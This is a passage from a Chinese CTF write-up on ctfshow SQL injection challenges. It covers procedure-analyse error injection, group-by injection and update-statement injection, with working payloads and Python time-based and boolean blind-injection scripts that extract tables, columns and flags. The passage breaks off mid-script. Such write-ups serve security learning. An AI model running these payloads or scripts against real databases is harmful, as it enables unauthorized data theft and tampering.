<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/?page=1&amp;limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)</span><br></pre></td></tr></table></figure></div>

<p>这里的page 1-1&#x3D;0，相当于只有后面的limit语句了</p>
<p>拼接之后的sql语句</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ctfshow_user limit <span class="number">0</span>,<span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,database())),<span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220823215511074.png"
                      alt="image-20220823215511074"
                ></p>
<h2 id="group-by注入"><a href="#group-by注入" class="headerlink" title="group by注入"></a>group by注入</h2><h3 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h3><p><strong>（gruop by 的报错注入）</strong></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html#1869274163" >CTF-sql-mysql group by报错注入 - 浅易深 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<ul>
<li><pre><code class="sql">select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2));
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  一定可以注入成功（要成功注入，前提表中的记录数至少为三条）</span><br><span class="line"></span><br><span class="line">- ```sql</span><br><span class="line">  select count(*) from information_schema.tables group by concat(database(),floor(rand()*2));却不一定了吧。</span><br></pre></td></tr></table></figure></div>

（要成功注入，前提表中的记录数至少为两条）
</code></pre>
</li>
</ul>
<h3 id="222"><a href="#222" class="headerlink" title="222"></a>222</h3><p><strong>（group by 时间盲注，我试了一下报错注入好像不行，不知道为啥，可能是学艺不精）</strong></p>
<p>还是先看题</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查询语句</span><br><span class="line">  <span class="comment">//分页查询</span></span><br><span class="line">  <span class="variable">$sql</span> = select * <span class="keyword">from</span> ctfshow_user group by <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">过滤    </span><br><span class="line">  <span class="comment">//<span class="doctag">TODO:</span>很安全，不需要过滤</span></span><br></pre></td></tr></table></figure></div>

<p>知道了gruop by 的注入原理之后，可以使用之前的时间盲注脚本，这里以笛卡尔积的脚本演示</p>
<p><strong>(大致就是group by 会执行by后面的语句（要知道怎么排序所以需要执行呗），然后会爆错，信息会出现在报错中，能带出信息最好，不行就盲注呗)</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://07654e27-2464-4ef8-ba5f-cafdafabfd66.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flaga,ctfshow_user</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagaabc,info,id,username,pass</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;ascii(mid((select flagaabc from ctfshow_flaga),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Cirno: 查询中(◍•ᴗ•◍)❤ &quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    params = &#123;<span class="string">&quot;u&quot;</span>:<span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,(select count(*) from information_schema.columns A,information_schema.tables B,information_schema.tables C),1) &quot;</span>&#125;</span><br><span class="line">    time_s = <span class="literal">None</span></span><br><span class="line">    time_e = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time_s = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            _ = requests.get(url=url,params=params)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        time_e = time.time()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 改用手动计时防止多次没跑完的笛卡尔积叠加卡死影响注入</span></span><br><span class="line">    <span class="keyword">return</span> time_e-time_s &gt; <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span>(<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        everage = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(payload.<span class="built_in">format</span>(index, everage)):</span><br><span class="line">            start = everage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = everage</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> result[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n本天才查询完成 ｡◕‿◕｡ &quot;</span>)</span><br></pre></td></tr></table></figure></div>



<p><strong>自己的快速半自动（速度快多了，不嫌咱这半自动麻烦可以用）</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://07654e27-2464-4ef8-ba5f-cafdafabfd66.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flaga,ctfshow_user</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagaabc,info,id,username,pass</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;ascii(mid((select flagaabc from ctfshow_flaga),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Cirno: 查询中(◍•ᴗ•◍)❤ &quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;u&quot;</span>: <span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1) &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    time_s = <span class="literal">None</span></span><br><span class="line">    time_e = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time_s = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            _ = requests.get(url=url,params=params)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        time_e = time.time()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 改用手动计时防止多次没跑完的笛卡尔积叠加卡死影响注入</span></span><br><span class="line">    <span class="keyword">return</span> time_e-time_s &gt; <span class="number">0.9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#半自动，请自动调整result</span></span><br><span class="line">index = <span class="number">1</span> + <span class="built_in">len</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span>(<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        everage = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(payload.<span class="built_in">format</span>(index, everage)):</span><br><span class="line">            start = everage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = everage</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> result[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n本天才查询完成 ｡◕‿◕｡ &quot;</span>)</span><br></pre></td></tr></table></figure></div>







<h3 id="223"><a href="#223" class="headerlink" title="223"></a>223</h3><p>题目上还是和之前一样</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = select * <span class="keyword">from</span> ctfshow_user group by <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>很安全，不需要过滤</span></span><br><span class="line"><span class="comment">//用户名不能是数字</span></span><br></pre></td></tr></table></figure></div>

<p>但是测试后发现用户名输入不能包含数字，密码返回也不能包含密码，使用true替换即可，根据sql查询语句，我们可以使用username，所以可以使用布尔盲注，这样就比时间盲注省时间多了</p>
<h4 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h4><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/?u=concat(database(),floor(rand()*(true%2Btrue)))</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220824210812216.png"
                      alt="image-20220824210812216"
                ></p>
<p><strong>可以明显发现有个列名是username，我们先group by 一下 username</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220824210909564.png"
                      alt="image-20220824210909564"
                ></p>
<p>这里就把所有的数据写出来了（但是没有flag的，所以我猜测是不密码中包含数字的显示，所以使用了盲注）</p>
<p>当然这里时间盲注也行，但是太慢了，能布尔盲注还是布尔，我们发现可以以  passwordAUTO  作为判断，我们只需要没执行语句替换为无passwordAUTO的就行了，于是我是用了”ctfshow”</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220824211200023.png"
                      alt="image-20220824211200023"
                ></p>
<p>上面的user1 和 user2不能用，被ban了嘛别做题做着做着做忘了</p>
<p>（我看有的师傅写的’a’也能行，不知道啥原理，有空上mysql试试&#x3D;。&#x3D;）</p>
<h4 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h4><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_num</span>(<span class="params">i: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;+&#x27;</span>.join(<span class="string">&quot;true&quot;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0b4bad5c-5040-42fc-93a4-f4a18f3629de.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagas,ctfshow_user</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,true))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagasabc,info,id,username,pass</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,true))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;ascii(mid((select flagasabc from ctfshow_flagas),&#123;&#125;,true))&gt;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Cirno: 查询中(◍•ᴗ•◍)❤ &quot;</span>)</span><br><span class="line">judge = <span class="string">&quot;passwordAUTO&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    username = <span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,username,&#x27;ctfshow&#x27;)&quot;</span></span><br><span class="line">    response = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>&quot;</span>, params=&#123;<span class="string">&quot;u&quot;</span>: username&#125;)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> judge <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span>(<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        everage = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(payload.<span class="built_in">format</span>(make_num(index), make_num(everage))):</span><br><span class="line">            start = everage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = everage</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\r[+] here is flag: <span class="subst">&#123;result&#125;</span>&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n本天才查询完成 ｡◕‿◕｡ &quot;</span>)</span><br></pre></td></tr></table></figure></div>







<h1 id="update"><a href="#update" class="headerlink" title="update"></a>update</h1><h2 id="231-232（一个是字符串）"><a href="#231-232（一个是字符串）" class="headerlink" title="231-232（一个是字符串）"></a>231-232（一个是字符串）</h2><p>题目</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure></div>



<p>看源码是post username和password</p>
<p>尝试</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=1&#x27; where 1=1#&amp;username=1</span><br></pre></td></tr></table></figure></div>

<p><strong>发现确实都更改了</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220827174004598.png"
                      alt="image-20220827174004598"
                ></p>
<p>然后我们就可以尝试去获取flag了，因为没有过滤且有回显，所以我们能直接构造payload去获取flag，还有一个需要注意的是，我们实际上修改的是username，因为password在update的时候是有引号包裹的，我们放入语句是会变成字符串的，因此不会执行。所以我们在update password的同时去修改username，剩下的就是普通的操作了</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># payload <span class="number">1</span> 看数据库（username修改的语句记得拿括号包裹，不然会因为之间有空格而被解析成语句。也就是username取<span class="keyword">select</span>，后面的都变语句了，就会出错）</span><br><span class="line"># information_schema,test,mysql,performance_schema,ctfshow_web</span><br><span class="line">password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;,username=(select group_concat(schema_name) from information_schema.schemata) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># payload 2 看数据表</span></span><br><span class="line"><span class="string"># banlist,ctfshow_user,flaga</span></span><br><span class="line"><span class="string">password=1&#x27;</span>,username<span class="operator">=</span>(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctfshow_web&#x27;</span>) <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="operator">&amp;</span>username<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># payload <span class="number">3</span> 看字段名</span><br><span class="line"># id,flagas,info</span><br><span class="line">password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flaga<span class="string">&#x27;) where 1=1#&amp;username=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># payload 4 看字段值</span></span><br><span class="line"><span class="string"># ctfshow&#123;0652bddc-e585-4772-9577-bacc23cfee9c&#125;</span></span><br><span class="line"><span class="string">password=1&#x27;</span>,username<span class="operator">=</span>(<span class="keyword">select</span> group_concat(flagas) <span class="keyword">from</span> flaga) <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="operator">&amp;</span>username<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div>



<h2 id="233（都是字符）"><a href="#233（都是字符）" class="headerlink" title="233（都是字符）"></a>233（都是字符）</h2><p>题目和上一题没什么区别，就是修改之后不会显示了，但是有返回成功还是失败的信息，所以布尔盲注吧，一个一个填充判断是否正确</p>
<p>（主要就是username这里也变成了字符串，所以我们写的语句都变成字符串了，没有解析，需要通过 where 子句中的if 来盲注）</p>
<p>exp</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 无过滤</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://339c2129-54eb-405c-a41e-9cbf6b64b5ba.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 表名 banlist,ctfshow_user,flag233333</span></span><br><span class="line"><span class="comment">#payload = &quot;if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,0) #&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagass233,info</span></span><br><span class="line"><span class="comment">#payload = &quot;if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag233333&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr((select flagass233 from flag233333),&#123;&#125;,1))&gt;&#123;&#125;,1,0) -- &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Cirno: 查询中(◍•ᴗ•◍)❤ &quot;</span>)</span><br><span class="line">judge = <span class="string">&quot;更新成功&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;ctfshow&#x27; and <span class="subst">&#123;p&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="built_in">str</span>(random.random())</span><br><span class="line">    &#125;</span><br><span class="line">    response = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> judge <span class="keyword">in</span> response.json()[<span class="string">&quot;msg&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(payload.<span class="built_in">format</span>(index,p)):</span><br><span class="line">            start = p</span><br><span class="line">        <span 